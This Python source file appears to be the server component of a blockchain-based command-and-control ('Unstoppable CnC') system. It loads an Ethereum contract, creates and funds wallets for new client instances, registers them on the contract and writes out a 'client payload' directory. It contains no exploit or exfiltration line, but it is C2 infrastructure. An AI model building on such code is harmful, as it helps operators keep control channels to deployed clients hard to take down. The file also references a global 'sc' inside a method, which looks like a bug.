import logging
import yaml
import os
import sys
from os.path import join as opj
from Util.LogWrapper import *
import yaml
from solc import compile_source
from web3 import Web3, HTTPProvider
from web3.contract import ConciseContract
import Client.OsInteractions as OsInteractions
from Util.EtherKeysUtil import *
from Server.DeployUnstoppableCnC import unlockAccount,generateKeyPair,getOwnerPassword

l = LogWrapper.getLogger()


class ServerCommands:

    def __init__(self, confFile):
        with open(confFile) as f:
            conf = yaml.safe_load(f)

        self.contractAddress = conf['contract']['address']
        self.contractAbi = conf['contract']['abi']

        l.debug ("connecting to local node", conf['nodeRpcUrl'])
        self.web3 = Web3(HTTPProvider(conf['nodeRpcUrl']))

        # load CnC contract
        self.contract = self.loadContract()
        #TODO: check contract is up, otherwise go to sleep or die

        self.ownerAddress = conf['ownerAddress']
        self.ownerPassword = conf['ownerWalletPassword']
        self.keyGenScript = conf['keyGenScript']
        l.info("contract owner wallet address:",self.ownerAddress)
        unlockAccount(self.ownerAddress, self.ownerPassword, self.web3)

        self.instances = set()


    def loadContract(self):

        l.info('loading contract from:', self.contractAddress, self.contractAbi)

        contract = self.web3.eth.contract(self.contractAbi, self.contractAddress,  ContractFactoryClass=ConciseContract)
        return contract



    '''
        
        :param fundValue: amount in wei to transfer to the client 
        :param clientConfTemplateFile: 
        :param clientId: 
        :param rpcPort: 
        :param walletJson: 
        :param walletPassword: 
        :return: 
    '''
    def generateNewClientInstance (self, fundValue, clientConfTemplateFile, clientId = '', rpcPort = 8595, port=30303, walletJson = None, walletPassword = None):
        with open(clientConfTemplateFile) as f:
            clientConfTemplate = yaml.safe_load(f)

        l.info ("Creating new Client instance")
        walletPassword = generatePassword(20) if walletPassword == None else walletPassword

        if not walletJson:
            l.info("Generating a new account")
            walletJson, public, private, address = generateWallet(
                self.keyGenScript, walletPassword)
        else:
            l.info("Loading existing wallet...")
            public, private, address = loadWallet(walletJson, walletPassword)

        l.info('Client Account Details:')
        l.info('\tPublic key:', public)
        l.info('\tAddress:', address)
        l.debug('\tPrivate key:', private)

        #Generate Conf
        clientConfTemplate['nodeRpcUrl'] = clientConfTemplate['nodeRpcUrl'].replace('%NODEPORT%', str(rpcPort))
        clientConfTemplate['BlockChainData'] = clientConfTemplate['BlockChainData'].replace('%CLIENT_ID%', clientId)
        clientConfTemplate['gethCmd'] = ' '.join(clientConfTemplate['gethCmd']) \
            .replace('%RPCPORT%', str(rpcPort)) \
            .replace('%NODEPORT%', str(port)) \
            .replace('%DATADIR%', clientConfTemplate['BlockChainData']) \
            .split(' ')
        clientConfTemplate['clientWallet'] = walletJson
        clientConfTemplate['clientWalletPassword'] = walletPassword

        # Package the Code
        #TODO add all components
        generatedDir = opj('generated',address)
        l.info('writing client payload into',generatedDir)
        os.makedirs(opj(generatedDir,'conf'), exist_ok=True)
        os.makedirs(opj(generatedDir, 'src'), exist_ok=True)
        os.makedirs(opj(generatedDir, 'bin'), exist_ok=True)
        with open(opj(generatedDir, 'conf', 'clientConf-test.yaml'), 'w') as f:
            yaml.safe_dump(clientConfTemplate, f)

        l.info ("Sending ",self.web3.fromWei(fundValue,"ether"),"ether to client wallet")
        sc.web3.eth.sendTransaction({'from': sc.ownerAddress, 'to': address,
                                     'value': fundValue, 'gas': 21000})

        tx_hash = self.contract.allowInstance(address, transact={'from': self.ownerAddress})
        l.debug('Call allowInstance on contract',self.contractAddress, 'tx_hash:',tx_hash)

        #TODO:Split the balance to a small amount up first in sendTransaction and add most of the funds in allowInstance, that way it will only be transfered if instance successfully registered.

        self.instances.add(address)

        return clientConfTemplate

if __name__ == "__main__":

    l.info("base dir ", sys.argv[1])
    os.chdir(sys.argv[1])

    sc = ServerCommands(opj('conf','gen', 'ServerConf.yaml'))

    clientConfTemplate = sc.generateNewClientInstance(1000000000000000000,opj('conf','gen', 'ClientConf.TEMPLATE.yaml'), port=30304)




